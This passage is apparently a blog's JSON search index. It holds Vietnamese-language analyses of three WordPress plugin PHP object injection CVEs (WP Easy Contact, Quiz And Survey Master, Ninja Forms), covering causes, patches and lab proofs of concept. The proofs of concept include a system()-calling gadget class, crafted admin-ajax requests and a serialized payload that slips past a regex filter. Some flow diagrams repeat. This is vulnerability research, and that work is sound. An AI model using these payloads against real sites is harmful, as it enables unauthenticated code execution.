[{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress WP Easy Contact Plugin.","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Deserialization of Untrusted Data trong emarket-design WP Easy Contact cho phép Object Injection. Vấn đề này ảnh hưởng đến WP Easy Contact: từ n/a đến 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 4.0.2 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress WP Easy Contact Plugin ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WP Easy Contact: 4.0.1 – vulnerable 4.0.2 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng xuất phát từ việc cho phép attacker khởi tạo đối tượng tùy ý từ input → PHP Object Injection. $widg_arr = explode(\"-\",$div_id); $mywidg = new $widg_arr[1](); Bản vá bổ sung whitelist và sanitize input → chỉ cho phép khởi tạo class hợp lệ, loại bỏ lỗ hổng. Sự thay đổi của bản vá\r","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rPlugin đăng ký một Ajax cho unauthenticated user (wp_ajax_nopriv): add_action('wp_ajax_nopriv_emd_get_widg_pagenum', 'emd_get_widg_pagenum'); Khi gửi request đến /wp-admin/admin-ajax.php với action=emd_get_widg_pagenum, callback emd_get_widg_pagenum sẽ được thực thi: function emd_get_widg_pagenum(){ $response = false; $pageno = isset($_GET['pageno']) ? (int) $_GET['pageno'] : 1; $div_id = isset($_GET['div_id']) ? sanitize_text_field($_GET['div_id']) : ''; $myapp = isset($_GET['app']) ? sanitize_text_field($_GET['app']) : ''; if(!empty($div_id)){ $pids = Array(); $front_ents = emd_find_limitby('frontend', $myapp); $widg_arr = explode(\"-\",$div_id); $mywidg = new $widg_arr[1](); ... } } Để đoạn new $widg_arr[1]() được gọi, cần vượt qua điều kiện if(!empty($div_id)), tức phải truyền giá trị cho tham số div_id trong GET request. $widg_arr[1] là phần tử được lấy từ mảng sau khi explode giá trị $_GET['div_id']. Ví dụ, nếu div_id=abc-Class thì $widg_arr[1] sẽ là Class, cho phép khởi tạo đối tượng tùy ý thông qua new $widg_arr[1](). ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\rgraph TD\rA[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"]\rB --\u003e C[\"Callback: emd_get_widg_pagenum()\"]\rC --\u003e D{\"Check if div_id is not empty\"}\rD -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"]\rE --\u003e F[\"Instantiate object: new $widg_arr[1]()\"]\r","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo class để test đặt trong wp-config.php class ObjectInjection { public $command; public function __construct(){ $this-\u003ecommand = $_GET['cmd']; } function __destruct(){ die(system($this-\u003ecommand)); } } Gửi lại request với payload GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-ObjectInjection\u0026cmd=ls+/ Kết quả\r","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng trong WP Easy Contact \u003c= 4.0.1 xuất phát từ việc xử lý input không an toàn, cho phép khởi tạo đối tượng trực tiếp từ dữ liệu người dùng. Bằng cách lợi dụng tham số div_id, attacker có thể thực hiện PHP Object Injection và dẫn đến thực thi mã tùy ý. Bản vá ở 4.0.2 đã khắc phục bằng cách bổ sung cơ chế whitelist và sanitize input, chỉ cho phép khởi tạo các class hợp lệ. Đây là minh chứng rõ ràng cho việc deserialization không an toàn có thể trở thành điểm khai thác nghiêm trọng khi kết hợp với quyền truy cập không xác thực. ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaways\rBề mặt tấn công không xác thực: Lỗ hổng được kích hoạt qua wp_ajax_nopriv, không cần đăng nhập. Nguyên nhân gốc rễ: Sử dụng trực tiếp input người dùng (new $widg_arr[1]()), không có kiểm tra. Chiến lược vá lỗi: Áp dụng whitelist và sanitize để giới hạn class hợp lệ. Best practice: Luôn kiểm tra và làm sạch dữ liệu đầu vào, tránh deserialization không an toàn, hạn chế khởi tạo đối tượng từ nguồn không tin cậy. ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rDeserialization WordPress WP Easy Contact Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Quiz And Survey Master Plugin.","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin này thực hiện thao tác unserialize dữ liệu mà người dùng gửi qua trường form, điều này có thể cho phép người dùng chưa xác thực thực hiện PHP Object Injection nếu tồn tại một gadget phù hợp trong hệ thống. CVE ID: CVE-2025-49401 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 10.2.5 Patched Versions: 10.2.6 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Quiz And Survey Master Plugin ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Quiz And Survey Master: 10.2.5 – vulnerable 10.2.6 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng xuất phát từ việc sử dụng maybe_unserialize(). Dù đã có biện pháp kiểm tra, cơ chế này vẫn chưa đảm bảo an toàn tuyệt đối. if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } if ( is_serialized( $qmn_sanitize_random_ids ) ) { $unserialized = maybe_unserialize( $qmn_sanitize_random_ids ); if ( ! is_object( $unserialized ) \u0026\u0026 ! is_resource( $unserialized ) ) { return $unserialized; } } Bản vá đã sử dụng unserialize() thay vì maybe_unserialize(). Chặn toàn bộ việc tạo object khi unserialize bằng ['allowed_classes' =\u003e false] =\u003e Ngăn chặn PHP Object Injection Sự thay đổi của bản vá\r","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rSau khi xem qua logic của hàm qsm_questions_answers_shortcode_to_text(), tôi nhận thấy các từ khóa như question và answer xuất hiện khá nhiều, cho thấy hàm này nhiều khả năng liên quan trực tiếp đến chức năng xử lý câu hỏi và câu trả lời. Thay vì lần theo từng bước trace, tôi sẽ chủ động tìm các chức năng có liên quan đến question và answer để sử dụng, đồng thời kết hợp debug tại hàm qsm_questions_answers_shortcode_to_text(). Nếu cách này không hiệu quả thì ta sẽ tiếp tục trace chi tiết. Sau một hồi tọc vạch, tôi đã tạo post với question tùy ý Tạo quiz với Block của plugin\rTruy cập post và submit answer Debugger ở hàm qsm_questions_answers_shortcode_to_text\rDebugger đã nhảy đến hàm qsm_questions_answers_shortcode_to_text() Request hiện tại: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: */* Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=----geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Length: 2373 Origin: http://localhost Connection: keep-alive Referer: http://localhost/index.php/2025/11/17/quiz-1/ Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_hidden_questions\" ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_nonce\" b667038586 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_unique_key\" 691b485dd00e5 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"question1\" 0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"answer_limit_keys_1\" ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qmn_question_list\" 1Q ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qmn_all_questions_count\" 1 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"total_questions\" 1 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"timer\" 3 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"timer_ms\" 0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qmn_quiz_id\" 1 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"complete_quiz\" confirmation ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"current_page\" 0 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"quiz_start_date\" 06:50:55 AM 11/17/2025 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"action\" qmn_process_quiz ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"nonce\" b667038586 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"qsm_unique_key\" 691b485dd00e5 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"currentuserTime\" 1763395682 ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4 Content-Disposition: form-data; name=\"currentuserTimeZone\" Asia/Bangkok ------geckoformboundary64b770b36de80c7ad71f430a81ec77b4-- Hàm qmn_sanitize_random_ids_data() sẽ gọi đến maybe_unserialize(). Nhưng trước hết phải đáp ứng điều kiện: if ( ! empty( $_POST['quiz_answer_random_ids'] ) ) Ta có thể tận dụng 1 trường trong HTTP request ở trên để thêm thay đổi thành quiz_answer_random_ids - Content-Disposition: form-data; name=\"currentuserTimeZone\" - Asia/Bangkok + Content-Disposition: form-data; ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"]\rB --\u003e C[\"ajax_submit_results()\"]\rC --\u003e D[\"submit_results()\"]\rD --\u003e E[\"display_results_text()\"]\rE --\u003e F[\"generate_pages()\"]\rF -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"]\rG --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"]\rH --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"}\rK -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"}\rM -- true --\u003e N[\"return ''\"]\rM -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"]\r","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rSử dụng plugin để tạo post chứ quiz bằng việc sử dụng QSM block Submit form và cho request đi qua Burp proxy Sửa lại value của quiz_answer_random_ids chứa chuổi serialized a:1:{i:0;O:15:\"ObjectInjection\":1:{s:7:\"command\";s:4:\"ls /\";}} Gửi lại request Mẹo Để test trên local, ta tạo class chứa magic method __wakeup() sẽ tự kích hoạt khi deserialized đặt nó trong wp-config.php class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-49401 xuất phát từ việc xử lý dữ liệu đầu vào thiếu an toàn với maybe_unserialize(), cho phép kẻ tấn công chưa xác thực cung cấp payload serialized để thực thi PHP Object Injection. Cơ chế lọc yếu dựa trên preg_match chỉ chặn payload bắt đầu bằng O: hoặc C:, nhưng hoàn toàn thất bại trước serialized array chứa object. Kết hợp với endpoint AJAX mở (wp_ajax_nopriv_qmn_process_quiz), luồng thực thi dẫn payload đi qua nhiều lớp xử lý trước khi bị unserialize, cuối cùng gây ra thực thi mã tùy ý (RCE) nếu tồn tại gadget phù hợp. Bản vá sử dụng unserialize(..., ['allowed_classes' =\u003e false]) đã loại bỏ hoàn toàn khả năng tạo object, từ đó xử lý triệt để lỗ hổng. ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaways\rmaybe_unserialize() luôn nguy hiểm khi xử lý dữ liệu đến từ người dùng, đặc biệt trong môi trường WordPress. Regex thủ công không đủ an toàn để ngăn khai thác deserialization — attacker có thể đóng gói payload trong array để bypass. AJAX endpoint dành cho unauthenticated user là bề mặt tấn công cực kỳ nhạy cảm và cần được kiểm tra nghiêm ngặt. allowed_classes = false là biện pháp phòng thủ hiệu quả nhất khi không cần unserialize object. Tính năng plugin càng phức tạp, nguy cơ xuất hiện gadget chain dẫn đến RCE càng cao. ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rDeserialization WordPress Quiz And Survey Master Plugin \u003c= 10.2.5 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-17","objectID":"/vi/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/vi/posts/2025-11-17-cve-2025-49401/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Forms Plugin.","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin này thực hiện thao tác unserialize dữ liệu mà người dùng gửi qua trường form, điều này có thể cho phép người dùng chưa xác thực thực hiện PHP Object Injection nếu tồn tại một gadget phù hợp trong hệ thống. CVE ID: CVE-2025-9083 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.11.0 Patched Versions: 3.11.1 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Forms Plugin ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Ninja Forms: 3.11.0 – vulnerable 3.11.1 – patched Diff Tool (diff) → Meld hoặc bất kỳ công cụ diff nào. ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Cause\rLỗ hổng xuất phát từ hàm extractSubmissions() thuộc file FieldsetRepeater.php if(is_string($fieldSubmissionValue)){ $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue); } maybe_unserialize() được gọi nhưng không có cơ chế chống lại tấn công PHP Object Injection Bản lỗi và bản vá\rBản vá đã sử dụng unserialize() thay vì maybe_unserialize(). Chặn toàn bộ việc tạo object khi unserialize bằng ['allowed_classes' =\u003e false] =\u003e Ngăn chặn PHP Object Injection ","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#cause"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rTên của class\rTên class tương ứng với một layout fields trong khi tạo blank form bằng plugin Tạo form với Repeatable Fieldset\rThử tạo form với Repeatable Fieldset sau đó kéo Single Line Text vào Repeatable Fieldset để làm input, embed nó vào post hoặc page Thêm form vào post\rPublic post và thử submit form với input là payload: Request thử với `payload`\rTa thấy toàn bộ dữ liệu được gán vào param formData, ta copy nội dung đã được URL Decode vào ứng dụng format JSON online https://jsonformatter.org/ Data dạng JSON được format\rQuan sát debugger ta thấy sự tương đồng ở đây Dữ liệu trong debugger\r$fieldSubmissionValue tương ứng với value trong field có id 8. Như vậy khi value là chuỗi thì nó sẽ gọi hàm maybe_unserialize() Ta tạo class và đặt trong wp-config.php để test sự kiện kích hoạt khi maybe_unserialize() được gọi. class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } Gửi lại request submit với giá trị của value là chuỗi serialize chứa payload. Vì bao bọc bên ngoài là JSON nên khi truyền chuỗi cần phải chú ý escape \" thành \\\" để tránh gây lỗi. Change giá trị của value thành chuỗi serialize\rGiá trị của value trong debugger\rShell thực thi =\u003e Deserialize được kích hoạt. Deserialize được kích hoạt\rLuồng gọi hàm của callstack: Ứng dụng đã đăng ký một ajax dành cho Unauthenticated user if( isset( $_POST['formData'] ) ) { $this-\u003e_form_data = json_decode( $_POST['formData'], TRUE ); // php5.2 fallback if( ! $this-\u003e_form_data ) $this-\u003e_form_data = json_decode( stripslashes( $_POST['formData'] ), TRUE ); } add_action( 'wp_ajax_nopriv_nf_ajax_submit', array( $this, 'submit' ) ); Tức khi gửi POST request đến endpoint /wp-admin/admin-ajax.php với param action=nf_ajax_submit thì callback submit được gọi Khi form được submit đầy đủ thì nó luồng gọi hàm sẽ theo trình tự này Luồng gọi hàm trong callstack\r","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/vi/posts/2025-11-14-cve-2025-9083/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"]\rB --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"]\rC --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"]\rD --\u003e E[\"NF_MergeTags_Fields::add_field()\"]\rE --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"]\rF --\u003e G[\"NF_Handlers_FieldsetRepeater::extractSubmissions()\"] --\u003e H{$fieldSubmissionValue is String?}\rH -- Yes --\u003e I[\"maybe_unserialize($fieldSubmissionValue)\"]\rI --\u003e K(\"RCE\")\r","date":"2025-11-14","objectID":"/vi/posts/2025-11-14-cve-2025-9083/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 